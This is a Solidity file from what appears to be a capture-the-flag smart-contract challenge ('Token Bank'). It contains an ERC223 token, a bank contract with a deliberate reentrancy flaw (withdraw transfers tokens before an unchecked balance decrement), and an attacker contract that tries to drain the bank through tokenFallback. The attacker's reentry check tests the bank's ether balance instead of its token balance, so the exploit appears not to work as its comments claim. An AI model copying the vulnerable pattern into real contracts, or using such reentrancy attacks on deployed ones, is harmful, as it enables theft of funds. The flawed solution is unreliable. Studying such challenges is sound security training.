// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITokenReceiver {
    function tokenFallback(
        address from,
        uint256 value,
        bytes memory data
    ) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(
        address to,
        uint256 value,
        bytes memory data
    ) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(
        address spender,
        uint256 value
    ) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) public {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes memory data
    ) public {
        require(msg.sender == address(token), "a");
        require(balanceOf[from] + value >= balanceOf[from], "b");

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount, "d");

        require(token.transfer(msg.sender, amount), "e");
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}

contract TokenBankAttacker {
    TokenBankChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = TokenBankChallenge(challengeAddress);
        token = challenge.token();
    }
    // Write your exploit functions here
    SimpleERC223Token public token;

    function attack() external {
        // Step 1: Withdraw all initial tokens from the challenge contract
        uint256 initialBalance = challenge.balanceOf(address(this));
        if (initialBalance > 0) {
            challenge.withdraw(initialBalance);
        }

        // Step 2: Transfer all tokens back to the challenge contract
        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(address(challenge), tokenBalance);

        // Step 3: Start the withdrawal process again
        challenge.withdraw(tokenBalance);
    }

    function tokenFallback(address from, uint256 value, bytes memory) external {
        // This function is called when tokens are transferred to this contract
        // We use it to continue the reentrancy attack
        if (from == address(challenge) && address(challenge).balance > 0) {
            uint256 remainingBalance = challenge.balanceOf(address(this));
            if (remainingBalance > 0) {
                challenge.withdraw(remainingBalance);
            }
        }
    }

    // Function to withdraw any remaining tokens after the attack
    function withdrawRemainingTokens() external {
        uint256 tokenBalance = token.balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to withdraw");
        require(token.transfer(msg.sender, tokenBalance), "Transfer failed");
    }

}